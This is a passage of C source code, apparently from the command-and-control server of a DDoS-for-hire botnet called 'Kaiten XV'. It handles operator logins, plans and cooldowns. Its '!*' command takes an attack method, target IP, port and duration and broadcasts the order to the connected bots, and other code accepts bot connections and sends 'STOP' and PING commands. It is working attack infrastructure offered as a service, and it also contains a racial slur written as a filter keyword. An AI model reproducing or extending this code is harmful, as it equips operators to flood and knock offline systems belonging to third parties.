				if(send(datafd, biddies5, strlen(biddies5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies6, strlen(biddies6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies7, strlen(biddies7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies8, strlen(biddies8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies9, strlen(biddies9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies10, strlen(biddies10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies11, strlen(biddies11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies12, strlen(biddies12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies13, strlen(biddies13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies14, strlen(biddies14), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies15, strlen(biddies15), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies16, strlen(biddies16), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies17, strlen(biddies17), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies18, strlen(biddies18), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies19, strlen(biddies19), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies20, strlen(biddies20), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies21, strlen(biddies21), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies22, strlen(biddies22), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies23, strlen(biddies22), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, ktn_banner1,  strlen(ktn_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner2,  strlen(ktn_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, ktn_banner3,  strlen(ktn_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner4,  strlen(ktn_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner5,  strlen(ktn_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner6,  strlen(ktn_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner7,  strlen(ktn_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner8,  strlen(ktn_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner9,  strlen(ktn_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannera,  strlen(ktn_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannerb,  strlen(ktn_bannerb),	MSG_NOSIGNAL) == -1) goto end;
			}


if(strcasestr(buf, "toggle1"))
{
	if(managements[datafd].msgtoggle == 0)
	{
		sprintf(usethis, "\e[1;37mRecieving Of Messages Has Been Turned \e[1;31mOFF\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		managements[datafd].msgtoggle = 1;
	} else {
		sprintf(usethis, "\e[1;37mRecieving Of Messages Has Been Turned \e[1;32mON\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		managements[datafd].msgtoggle = 0;		
	}
}

if(strcasestr(buf, "toggle2"))
{
	if(managements[datafd].broadcasttoggle == 0)
	{
		sprintf(usethis, "\e[1;37mRecieving Of Brodcasts Has Been Turned \e[1;31mOFF\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		managements[datafd].broadcasttoggle = 1;
	} else {
		sprintf(usethis, "\e[1;37mRecieving Of Brodcasts Has Been Turned On\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		managements[datafd].broadcasttoggle = 0;		
	}
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           //yeet
           if(strstr(buf, "!*"))// argv [0] = !* || argv[1] = METHOD || argv[2] = IP || argv[3] = Port  || argv[4] = maxtime
            {
            	if(AttackStatus == 0)
            	{
            		if(managements[datafd].cooldownstatus == 0)
            		{
            			int gonnasend = 0;
                		char rdbuf[1024];
                		strcpy(rdbuf, buf);
                		int argc = 0;
                		unsigned char *argv[10 + 1] = { 0 };
                		char *token = strtok(rdbuf, " ");
                		while(token != 0 && argc < 10)
                		{
                		    argv[argc++] = malloc(strlen(token) + 1);
                		    strcpy(argv[argc - 1], token);
                		    token = strtok(0, " ");
                		} 
                	    
                			if(argc <= 4) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[1;31mYou Typed It Incorrect\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			}
						

                			else if(atoi(argv[4]) > managements[datafd].mymaxtime) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[1;31mAttack Time Exceeded\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			} else {
		
                				char *line3 = NULL;
								size_t n3 = 0;
								FILE *f3 = fopen("logs/Blacklist.txt", "r");
								    while (getline(&line3, &n3, f3) != -1){
								        if (strstr(line3, argv[2]) != NULL){
								        	gonnasend = 1;
								        	sprintf(usethis, "\e[1;37mThe IP \e[1;31m%s \e[1;37mIs Blacklisted\r\n", argv[2]);	
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
											sprintf(usethis, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[datafd].id);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								    }
								}
								fclose(f3);
								free(line3);
            					broadcast(buf, 0, "lol");
            					printf("\e[1;37mUser: [%s]: Sent A \e[1;35m[%s] \e[1;37mAttack To: \e[1;31m[%s] \e[1;37mFor: \e[1;36m[%d] \e[1;37mSeconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            					int sendattacklisten;
            					for(sendattacklisten=0;sendattacklisten<MAXFDS;sendattacklisten++)
            					if(managements[sendattacklisten].listenattacks == 1 && managements[sendattacklisten].connected == 1)
            					{
            						sprintf(botnet, "\r\n\e[1;37mUser: [%s]: Sent A \e[1;35m[%s] \e[1;37mAttack To: \e[1;31m[%s] \e[1;37mFor: \e[1;36m[%d] \e[1;37mSeconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            						if(send(sendattacklisten, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
								      
            						sprintf(usethis, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[sendattacklisten].id);
            						if(send(sendattacklisten, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
            					}
            					char clearScreen[] = "\033[H\033[J";
            					if (send(datafd, clearScreen, strlen(clearScreen), MSG_NOSIGNAL) == -1) goto end;
            					
            					memset(buf, 0, sizeof(buf));      
            					char attacksentrip[80][2048];
            					int rip;
            					sprintf(attacksentrip[0],"\e[38;2;125;125;255m \r\n");
            					sprintf(attacksentrip[1],"\e[38;2;125;125;255m               ╔═══════════════════════════════╗                      \r\n");
            					sprintf(attacksentrip[2],"\e[38;2;125;125;255m                    Kaiten XV Attack Stats                               \r\n");
            					sprintf(attacksentrip[3],"\e[1;37m                 [Target IP]:    %s                \r\n", argv[2]); 
            					sprintf(attacksentrip[4],"\e[1;37m                 [Target Port]:  %s                \r\n", argv[3]);
            					sprintf(attacksentrip[5],"\e[1;37m                 [Method Used]:  %s                \r\n", argv[1]); 
            					sprintf(attacksentrip[6],"\e[1;37m                 [Cooldown]:     %d                \r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);  // time, atoi used to convert string to integer, visa versa
            					sprintf(attacksentrip[7],"\e[1;37m                 [Attack Time]:  %s                               \r\n", argv[4]);
            					sprintf(attacksentrip[8],"\e[1;37m                 [Servers Used]: %d                              \r\n", botsconnect());
            					sprintf(attacksentrip[9], "\e[1;37m                [Kaiten Plan]:  %s                               \r\n", managements[datafd].planname);
            					sprintf(attacksentrip[10],"\e[1;37m                [Kaiten User]:  %s                               \r\n", managements[datafd].id);
            					sprintf(attacksentrip[11],"\e[38;2;125;125;255m                Thank You For Using Kaiten XV                                \r\n");
            					sprintf(attacksentrip[12],"\e[38;2;125;125;255m              ╚═══════════════════════════════╝\r\n");
  								for(rip=0;rip<30;rip++)
   								{
  									if(send(datafd, attacksentrip[rip], strlen(attacksentrip[rip]), MSG_NOSIGNAL) == -1) goto end;
  								}
  								pthread_t cooldownthread;
  								struct CoolDownArgs argz;	
  								if(managements[datafd].mycooldown > 1)
  								{
  									argz.sock = datafd;
  									argz.seconds = managements[datafd].mycooldown;
  									pthread_create(&cooldownthread, NULL, &StartCldown, (void *)&argz);
  								}
  							} 
                	} else {
                			sprintf(usethis, "\e[1;31mYour Cooldown Has Not Expired! - Time left: \e[1;36m[%d]\r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                	}
                } else {
                			sprintf(usethis, "\e[1;31mAttacks Are Currently Disabled\r\n");
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;                	
                }
                memset(buf, 0, sizeof(buf));  
            }	


            if(strcasestr(buf, "nigger") || strcasestr(buf, "nig") || strcasestr(buf, "n1g") || strcasestr(buf, "nlg"))
            {
  					sprintf(usethis, "\e[1;31mPlease Do Not Use The 'N' Word\r\n");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;           	
            }

            if(strcasestr(buf, "Logout"))
            {	
            	char logout[800];
            	sprintf(logout, "Please Wait While We Log You Out...\r\n");
            	if(send(datafd, logout, strlen(logout), MSG_NOSIGNAL) == -1) goto end;
            	sleep(2);
				managements[datafd].connected = 0;
				memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
				close(datafd);
            }

			if(strcasestr(buf, "STOP"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				
				sprintf(killattack, "STOP");
				broadcast(killattack, datafd, "output.");
				sprintf(usethis, "\e[1;37mStopping All Your Attacks\r\n");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			}

            if(strcasestr(buf, "CLEAR") || strcasestr(buf, "cls")) {
			{
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
				goto main_banner;
			}

			if(strlen(buf) > 80)
			{
				char fuckyou[8000];
				sprintf(fuckyou, "\e[1;31mCNC Crashing Detected!!! We Are Kicking You In 3 Seconds\r\n");
				if(send(datafd, fuckyou, strlen(fuckyou), MSG_NOSIGNAL) == -1) goto end;
			}
	}
						char input[800];
        		sprintf(input, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[datafd].id);
						if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
      				      printf("%s: \"%s\"\n",accounts[find_line].username, buf);
            				memset(buf, 0, sizeof(buf));
}

   


		end:
				for(logoutshit=0;logoutshit<MAXFDS;logoutshit++)
				{
					if(managements[logoutshit].LoginListen == 1 && managements[logoutshit].connected == 1 && loggedin == 0)
					{
						gay[datafd].just_logged_in = 0;
						sprintf(usethis, "\r\n\e[1;37mUser: [%s] Plan: [%s] Just Logged Out!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[logoutshit].id);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
				}
		loggedin = 1;
		managements[datafd].connected = 0;
		memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
		close(datafd);
		OperatorsConnected--;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


void *BotListener(int port) {
 int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {    
        	    client_addr(cli_addr);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}


int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

        checkaccounts();
        checklog();
       	printf("\e[1;37mKaiten XV Has Been Screened \r\n"); 
		threads = atoi(argv[2]);
		port = atoi(argv[3]);
        printf("port: %s\n",argv[3]);
        printf("threads: %s\n", argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}

